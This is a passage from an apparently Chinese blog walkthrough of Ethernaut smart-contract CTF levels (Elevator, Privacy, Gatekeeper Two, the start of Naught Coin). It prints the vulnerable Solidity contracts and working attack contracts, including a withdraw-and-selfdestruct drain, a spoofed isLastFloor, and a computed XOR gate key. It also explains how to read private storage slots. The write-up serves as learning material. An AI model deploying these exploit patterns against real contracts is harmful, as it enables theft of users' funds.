operator">==</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'target balance>0'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">selfdestruct</span><span class="token punctuation">(</span><span class="token keyword">payable</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  <span class="token function">receive</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">external</span> <span class="token keyword">payable</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token builtin">uint</span> amount<span class="token operator">=</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token number">1e18</span><span class="token punctuation">,</span><span class="token builtin">address</span><span class="token punctuation">(</span>target<span class="token punctuation">)</span><span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>amount<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>      target<span class="token punctuation">.</span><span class="token function">withdraw</span><span class="token punctuation">(</span>amount<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>  <span class="token keyword">function</span> <span class="token function">min</span><span class="token punctuation">(</span><span class="token builtin">uint</span> x<span class="token punctuation">,</span><span class="token builtin">uint</span> y<span class="token punctuation">)</span> <span class="token keyword">private</span> <span class="token keyword">pure</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">return</span> x<span class="token operator">&lt;=</span> y <span class="token operator">?</span> x <span class="token punctuation">:</span> y<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="elevator"><a class="anchor" href="#elevator">#</a> Elevator</h2><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">interface</span> <span class="token class-name">Building</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">function</span> <span class="token function">isLastFloor</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Elevator</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token builtin">bool</span> <span class="token keyword">public</span> top<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token builtin">uint</span> <span class="token keyword">public</span> floor<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token keyword">function</span> <span class="token function">goTo</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _floor<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    Building building <span class="token operator">=</span> <span class="token function">Building</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> building<span class="token punctuation">.</span><span class="token function">isLastFloor</span><span class="token punctuation">(</span>_floor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>      floor <span class="token operator">=</span> _floor<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>      top <span class="token operator">=</span> building<span class="token punctuation">.</span><span class="token function">isLastFloor</span><span class="token punctuation">(</span>floor<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>要求到达 top floor。</p><p>buliding 是一个加载调用者得知的接口。而要想达到 top floor。则须经过 isLastFloor 的检测。然而却需要两次检测，第一次是 false，第二次是 true。</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">interface</span> <span class="token class-name">Building</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token keyword">function</span> <span class="token function">isLastFloor</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Elevator</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token builtin">bool</span> <span class="token keyword">public</span> top<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token builtin">uint</span> <span class="token keyword">public</span> floor<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token keyword">function</span> <span class="token function">goTo</span><span class="token punctuation">(</span><span class="token builtin">uint</span> _floor<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    Building building <span class="token operator">=</span> <span class="token function">Building</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> building<span class="token punctuation">.</span><span class="token function">isLastFloor</span><span class="token punctuation">(</span>_floor<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>      floor <span class="token operator">=</span> _floor<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>      top <span class="token operator">=</span> building<span class="token punctuation">.</span><span class="token function">isLastFloor</span><span class="token punctuation">(</span>floor<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Hack</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>  Elevator <span class="token keyword">private</span> immutable target<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>  <span class="token builtin">uint</span> <span class="token keyword">public</span> count<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _target<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>     target<span class="token operator">=</span><span class="token function">Elevator</span><span class="token punctuation">(</span>_target<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>  <span class="token keyword">function</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">external</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>    target<span class="token punctuation">.</span><span class="token function">goTo</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="29"></td><td><pre>    <span class="token keyword">require</span><span class="token punctuation">(</span>target<span class="token punctuation">.</span><span class="token function">top</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'not top'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>  <span class="token keyword">function</span> <span class="token function">isLastFloor</span><span class="token punctuation">(</span><span class="token builtin">uint</span><span class="token punctuation">)</span> <span class="token keyword">external</span> <span class="token keyword">returns</span><span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="32"></td><td><pre>    count<span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="33"></td><td><pre>    <span class="token keyword">return</span> count<span class="token operator">></span><span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="34"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="35"></td><td><pre></pre></td></tr><tr><td data-num="36"></td><td><pre></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>当我们调用 goTo 函数时 Building building = Building (msg.sender);，将是攻击合约的地址。我们创建 isLastFloor，通过跟踪调用次数，来进行检验。</p><h2 id="privacy"><a class="anchor" href="#privacy">#</a> Privacy</h2><p>要求 unlock 为 false，</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">Privacy</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token builtin">bool</span> <span class="token keyword">public</span> locked <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token comment">//1 slot0</span></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token builtin">uint256</span> <span class="token keyword">public</span> ID <span class="token operator">=</span> block<span class="token punctuation">.</span>timestamp<span class="token punctuation">;</span> <span class="token comment">// 32 slot1</span></pre></td></tr><tr><td data-num="7"></td><td><pre>  <span class="token builtin">uint8</span> <span class="token keyword">private</span> flattening <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span> <span class="token comment">//2 slot2</span></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token builtin">uint8</span> <span class="token keyword">private</span> denomination <span class="token operator">=</span> <span class="token number">255</span><span class="token punctuation">;</span> <span class="token comment">//2 slot2</span></pre></td></tr><tr><td data-num="9"></td><td><pre>  <span class="token builtin">uint16</span> <span class="token keyword">private</span> awkwardness <span class="token operator">=</span> <span class="token builtin">uint16</span><span class="token punctuation">(</span>block<span class="token punctuation">.</span>timestamp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//4 slot2</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token keyword">private</span> data<span class="token punctuation">;</span> <span class="token comment">//32 slot3</span></pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">bytes32</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token keyword">memory</span> _data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    data <span class="token operator">=</span> _data<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>  </pre></td></tr><tr><td data-num="16"></td><td><pre>  <span class="token keyword">function</span> <span class="token function">unlock</span><span class="token punctuation">(</span><span class="token builtin">bytes16</span> _key<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">require</span><span class="token punctuation">(</span>_key <span class="token operator">==</span> <span class="token builtin">bytes16</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    locked <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>要想解开，需要使 _key == bytes16 (data [2]), 也就是说我们需要得到定长数组 data 的第三个数据。由于变量是私有的，没有 getter 函数可以直接调用获得存储的 key。</p><p>但是可以使用 web3 库来调用。根据存储的规则，data 数组为定长数组，第一个数据存储再 slot3，所以 data [2] 存储在 slot5.</p><p>然后需要前 16 个字节，两个字符为一个字节，2+2*16=34</p><p>得到密钥，然后将其合约填入并调用 unlock 函数即可通关。</p><h2 id="gatekeeper-two"><a class="anchor" href="#gatekeeper-two">#</a> Gatekeeper Two</h2><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.6.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">GatekeeperTwo</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre>  <span class="token builtin">address</span> <span class="token keyword">public</span> entrant<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre></pre></td></tr><tr><td data-num="8"></td><td><pre>  <span class="token keyword">modifier</span> <span class="token function">gateOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender <span class="token operator">!=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">_</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre></pre></td></tr><tr><td data-num="13"></td><td><pre>  <span class="token keyword">modifier</span> <span class="token function">gateTwo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token builtin">uint</span> x<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token keyword">assembly</span> <span class="token punctuation">&#123;</span> x <span class="token operator">:=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span><span class="token function">caller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">require</span><span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">_</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre></pre></td></tr><tr><td data-num="20"></td><td><pre>  <span class="token keyword">modifier</span> <span class="token function">gateThree</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span> _gateKey<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="21"></td><td><pre>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">uint64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">_</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="24"></td><td><pre></pre></td></tr><tr><td data-num="25"></td><td><pre>  <span class="token keyword">function</span> <span class="token function">enter</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span> _gateKey<span class="token punctuation">)</span> <span class="token keyword">public</span> gateOne gateTwo <span class="token function">gateThree</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span> <span class="token keyword">returns</span> <span class="token punctuation">(</span><span class="token builtin">bool</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    entrant <span class="token operator">=</span> tx<span class="token punctuation">.</span>origin<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="29"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>三个关卡，然后 true</p><p>Analyse<br>第一关我们可以使用智能合约调用 enter，而不是账号。</p><p>第二关，只允许外部调用，不允许合约之间调用。</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">modifier</span> <span class="token function">gateTwo</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>   <span class="token builtin">uint</span> x<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>   <span class="token keyword">assembly</span> <span class="token punctuation">&#123;</span> x <span class="token operator">:=</span> <span class="token function">extcodesize</span><span class="token punctuation">(</span><span class="token function">caller</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>   <span class="token keyword">require</span><span class="token punctuation">(</span>x <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>   <span class="token keyword">_</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre> <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>第三关</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">modifier</span> <span class="token function">gateThree</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span> _gateKey<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>    <span class="token keyword">require</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>sender<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token builtin">uint64</span><span class="token punctuation">(</span>_gateKey<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">uint64</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">_</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>uint64 (0) – 1，为 uint64 最大值。</p><p>bytes8 (keccak256 (abi.encodePacked (msg.sender))) 部分是从 msg.sender (即本例中的 Exploiter 合约) 中抽取低位的 8 字节并将其转换为 uint64。</p><p>指令 a ^ b 是位的 XOR（异或）操作。XOR 操作是这样的：如果位置上的两个位相等，将产生一个 &quot;0&quot;，否则将产生一个 &quot;1&quot;。为了使 a ^ b = type (uint64).max（都是 1）， b 必须是 a 的逆数。</p><p>这意味着我们的 gateKey 必须是 bytes8 (keccak256 (abi.encodePacked (msg.sender)) 的逆数。</p><p>在 solidity 中，没有 &quot;逆数&quot; 的操作，但我们可以通过输入数和一个只有 &quot;F&quot; 的值之间做 &quot;XOR&quot; 来重新创建它。<br>所以只需计算 bytes8 (keccak256 (abi.encodePacked (address (this)))) ^ 0xFFFFFFFFFFFFFFFF</p><p>attack</p><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">attack</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>  <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _vum<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token builtin">bytes8</span> _key <span class="token operator">=</span> <span class="token builtin">bytes8</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">(</span><span class="token builtin">bytes8</span><span class="token punctuation">(</span><span class="token function">keccak256</span><span class="token punctuation">(</span>abi<span class="token punctuation">.</span><span class="token function">encodePacked</span><span class="token punctuation">(</span><span class="token builtin">address</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token function">type</span><span class="token punctuation">(</span><span class="token builtin">uint64</span><span class="token punctuation">)</span><span class="token punctuation">.</span>max<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token builtin">bytes</span> <span class="token keyword">memory</span> payload <span class="token operator">=</span> abi<span class="token punctuation">.</span><span class="token function">encodeWithSignature</span><span class="token punctuation">(</span><span class="token string">"enter(bytes8)"</span><span class="token punctuation">,</span>_key<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">(</span><span class="token builtin">bool</span> success<span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token operator">=</span>_vum<span class="token punctuation">.</span><span class="token function">call</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">require</span><span class="token punctuation">(</span>success<span class="token punctuation">,</span><span class="token string">"failed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>  <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h2 id="naught-coin"><a class="anchor" href="#naught-coin">#</a> Naught Coin</h2><figure class="highlight solidity"><figcaption data-lang="Solidity (Ethereum)"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// SPDX-License-Identifier: MIT</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.8.0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token keyword">import</span> <span class="token string">"openzeppelin-contracts-08/token/ERC20/ERC20.sol"</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">contract</span> <span class="token class-name">NaughtCoin</span> <span class="token keyword">is</span> ERC20 <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token comment">// string public constant name = 'NaughtCoin';</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token comment">// string public constant symbol = '0x0';</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token comment">// uint public constant decimals = 18;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token builtin">uint256</span> <span class="token keyword">public</span> timeLock <span class="token operator">=</span> block<span class="token punctuation">.</span>timestamp <span class="token operator">+</span> <span class="token number">10</span> <span class="token operator">*</span> <span class="token number">365</span> days<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token builtin">uint256</span> <span class="token keyword">public</span> INITIAL_SUPPLY<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token builtin">address</span> <span class="token keyword">public</span> player<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">constructor</span><span class="token punctuation">(</span><span class="token builtin">address</span> _player<span class="token punctuation">)</span> <span class="token function">ERC20</span><span class="token punctuation">(</span><span class="token string">"NaughtCoin"</span><span class="token punctuation">,</span> <span class="token string">"0x0"</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        player <span class="token operator">=</span> _player<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        INITIAL_SUPPLY <span class="token operator">=</span> <span class="token number">1000000</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">10</span> <span class="token operator">**</span> <span class="token builtin">uint256</span><span class="token punctuation">(</span><span class="token function">decimals</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token comment">// _totalSupply = INITIAL_SUPPLY;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token comment">// _balances[player] = INITIAL_SUPPLY;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token function">_mint</span><span class="token punctuation">(</span>player<span class="token punctuation">,</span> INITIAL_SUPPLY<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token keyword">emit</span> 